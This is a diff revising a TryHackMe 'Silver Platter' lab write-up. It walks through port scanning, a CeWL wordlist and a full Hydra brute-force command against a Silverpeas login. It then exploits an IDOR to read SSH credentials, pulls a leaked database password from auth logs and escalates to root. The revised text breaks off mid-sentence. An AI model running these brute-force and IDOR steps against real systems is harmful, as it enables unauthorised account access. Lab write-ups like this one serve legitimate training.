@@ -1,27 +1,29 @@
-### Action items
+Tryhackme Room:-
+Action Items
 
--   Enumeration:-
--   Scanning:-
--   Accessing To Data:-
--   Exploiting Vulnerability:-
--   Post-Exploitation Of SSH
--   Privacy Escalation with User Of SSH
--   Post-Exploitation for Root User
--   Privacy Escalation for Root User
+- Enumeration
+- Scanning
+- Accessing Data
+- Exploiting Vulnerabilities
+- Post-Exploitation of SSH
+- Privilege Escalation with SSH User
+- Post-Exploitation for Root User
+- Privilege Escalation for Root User
 
-### Silver Platter:-
+Silver Platter
 
-Provide an overview of the project’s goals and context
+Project Overview
 
-**Enumeration:-**
+This project aims to explore and exploit vulnerabilities in the Silver Platter environment.
 
-(Nmap) :-
+Enumeration
 
-To scan TCP 
+Nmap:
 
-two to ports are open 22 and 80 ,8080, ssh,http
+To scan TCP ports, we identified the following open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).
 
-(SSH):-
+SSH Access:
+
 
 ┌──(root㉿kali)-[/home/kali]
 └─# ssh root@silverplatter.thm
@@ -32,170 +34,68 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'silverplatter.thm' (ED25519) to the list of known hosts.
 root@silverplatter.thm's password:
 
-### (HTTP):-
-
-Dirsearch:-
-
-
+HTTP Access:-
+Dirsearch:
 dirsearch -u http://silverplatter.thm
-[10:49:29] 403 -  564B  - /assets/                                          
-[10:49:29] 301 -  178B  - /assets  ->  http://silverplatter.thm/assets/     
-[10:50:16] 301 -  178B  - /images  ->  http://silverplatter.thm/images/     
-[10:50:16] 403 -  564B  - /images/
-[10:50:26] 200 -   17KB - /LICENSE.txt                                      
-[10:51:06] 200 -  771B  - /README.txt   
+Results:
 
+403 - /assets/
+301 - /assets -> http://silverplatter.thm/assets/
+301 - /images -> http://silverplatter.thm/images/
+403 - /images/
+200 - /LICENSE.txt
+200 - /README.txt
 
-Vhosts
+Vhosts:
+ffuf -u http://silverplatter.thm -H 'Host: FUZZ.silverplatter.thm' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -mc all
+No useful matches found.
 
-
-ffuf -u http://silverplatter.thm -H 'Host: FUZZ.silverplatter.thm' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -mc all 14124
-not mch Usefull
-
-
-Website Features Notes:
-
-In Contact Page of Website We Got this :\Contact
+Website Features:-
+On the contact page, we found the following message:
 
 If you'd like to get in touch with us, please reach out to our project manager on “Silverpeas”. His username is "scr1ptkiddy".
 
-### HTTP(8080):-Is Running
+HTTP (8080) Access
+Silverpeas is running on port 8080, accessible at /Silverpeas.
 
-We got Silverpeas Running on it :- 
+Initial Access
+Despite limited findings, the contact form referenced Silverpeas. Accessing http://silverpeas.thm:8080/silverpeas/ revealed a login page. There are known CVEs for this software, which will be explored later.
 
-Accessible by /Silverpeas ➖
+To edit /etc/hosts, we can use the username from the contact form to brute-force the login using Hydra. The room description suggests that rockyou.txt may not be helpful, so we will create a custom wordlist using CeWL.
 
-## Initial Access:-
-
-Despite the lack of findings, the contact form provides a reference to 
-Silverpeas. Using this clue, we try accessing 
-http://silverpeas.thm:8080/silverpeas/ and discover a login page for 
-Silverpeas. There are some known CVEs for this software, we’ll get to 
-this later.
-
-http://silverpeas.thm:8080/silverpeas
-to this edit /etc/hosts
-
-
-Since we have a username from contact form, we could try to brute-force the login using [hydra](https://github.com/vanhauser-thc/thc-hydra).
- As the room description gives us the clue, rockyou.txt may not be the 
-help here, but we can create a wordlist using the words on the 
-http://silverplatter.thm page. We use [cewl](https://github.com/digininja/CeWL) to do this.
-
-Why We Use This: (they check it against the rockyou.txt wordlist - that's how 'cool' they are). 
 
 cewl http://silverplatter.thm > pass.txt
-to get all keyword as passwd
-
-
-Now, we intercept and analyze a login request using Burp to gather the necessary information for crafting our Hydra command. This involves capturing the HTTP POST request sent when attempting to log in, identifying critical details such as the target URL, form parameters, and the server’s response to incorrect credentials.
+Next, we intercept and analyze a login request using Burp Suite to gather the necessary information for crafting our Hydra command. This involves capturing the HTTP POST request sent during login, identifying critical details such as the target URL, form parameters, and the server’s response to incorrect credentials.
 
 Analyzing Key Components:
 
-- Target: silverplatter.thm
-- Port: 8080
-- Form Path: /silverpeas/AuthenticationServlet
-- Parameters: Login, Password, DomainId
-- Failure Condition: The response contains “Login or password incorrect.”
+Target: silverplatter.thm
+Port: 8080
+Form Path: /silverpeas/AuthenticationServlet
+Parameters: Login, Password, DomainId
+Failure Condition: The response contains “Login or password incorrect.”
 
 
+Hydra Command:
 hydra -l scr1ptkiddy -P pass.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect" -V
-use hydra to get pass
 
+We successfully obtained the password.
 
-We got The Passwd Also:-
+Login Credentials
+Username: scr1ptkiddy
+Password: [********]
+Upon logging in, I noticed a notification from the Manager. I will inspect the message system further to gather more information.
 
-Next Step to Login :-Usrname:scr1ptkiddy & Passwd:******g
+Exploiting Insecure Direct Object Reference (IDOR)
+After clicking “See more”, I was redirected to the My Notifications > Inbox page, which stores messages. The URL displayed an ID of 5, yet only one message was present, indicating a potential IDOR vulnerability.
 
-{scr1ptkiddy adipiscing}
-
-![image.png](attachment:11ed5a4a-477d-496b-9166-e712e43c0cad:image.png)
-
-I Got Login To application:-
-
-Upon logging in, I noticed a notification, which I clicked on, revealing a message from the **Manager**. I will inspect the **message system** further at a later time to gather more information.
-
-![image.png](attachment:286afc1a-4270-488e-b626-add7addeef24:image.png)
-
-# Exploiting Insecure Direct Object Reference (IDOR)
-
-After clicking **“See more”**, I was redirected to the **My Notifications > Inbox** page, which stores messages.
-
-![image.png](attachment:de926853-e352-46b7-8778-44adaef98c55:image.png)
-
-However, something seemed off: the URL displayed an ID of **5**, yet only one message was present on the page. This raised a red flag, and my first thought was that it might be an **Insecure Direct Object Reference (IDOR)** vulnerability.
-
-![image.png](attachment:b63b57e5-b294-432d-80d6-e5d7195f0dbc:image.png)
-
-I decided to test this theory by changing the ID in the URL from **5** to **4**, and it worked! The page displayed a message that was not visible in the inbox, confirming the presence of an **IDOR** vulnerability.
-After that, I continued testing by starting with **ID=0** and incrementally checking higher values. Eventually, I discovered that **ID=6** returned a message containing **SSH credentials**, specifically the username **Tim**.
-
-![image.png](attachment:b60b9a0d-d542-4fe6-b634-1130890131b0:image.png)
-
-I then used the **SSH credentials** obtained from the message to log in.
-
-![image.png](attachment:4c6e243b-292e-4dfe-8c1a-5ef5c6d48a61:image.png)
-
-Upon accessing the system, I found the **first flag** located in the **home directory** of the user **Tim**.
-
-by doing 
-
-
-cat user.txt
-
-
-we need to do post-exploitation on linux 
-
- 
-
-### Post-Exploitation:-
-
-
-tim@silver-platter:~$ id
-uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
-here is unique adm grp as admin grop so to check at log and did bureforues on by ls -la and by grep -ir 'password and we got postgresql database passwd and getin to it 
-
-
-auth.log.2:Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
-auth.log.2:Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
-auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
-
-
-
-and gone to root home  dir 
-
-tim@silver-platter:/home$ su tyler
-
-
-we used paswd and get login 
-
-now again post-expositions start here 
-
-
-tyler@silver-platter:~$ id 
-uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
- 
-
-get into root user now 
-
-
-sudo su 
-type passwd what u got first on it 
-
-
-just go to /root
- dir and do 
-
-
-ls
-cat root.txt
-
+By changing the ID in the URL from 5 to 4, I confirmed the presence of an IDOR vulnerability, as it displayed a message not visible in the inbox. Continuing this process, I discovered that **ID=
 
 # **Summary:-**
 
-1. **Enumeration:** Identified three open ports and discovered Silverpeas on port 8080.
-2. **Brute-forcing:** Used a custom wordlist to crack Silverpeas credentials.
-3. **Exploitation:** Leveraged a Silverpeas vulnerability to extract SSH credentials.
-4. **Privilege Escalation:** Accessed log files to retrieve passwords, switched users, and escalated to root.
+1. Enumeration: Identified three open ports and discovered Silverpeas on port 8080.
+2. Brute-forcing: Used a custom wordlist to crack Silverpeas credentials.
+3. Exploitation: Leveraged a Silverpeas vulnerability to extract SSH credentials.
+4. Privilege Escalation: Accessed log files to retrieve passwords, switched users, and escalated to root.
 
 This methodical approach showcases the importance of enumeration, targeted brute-forcing, and exploiting misconfigurations or known vulnerabilities to complete the room.
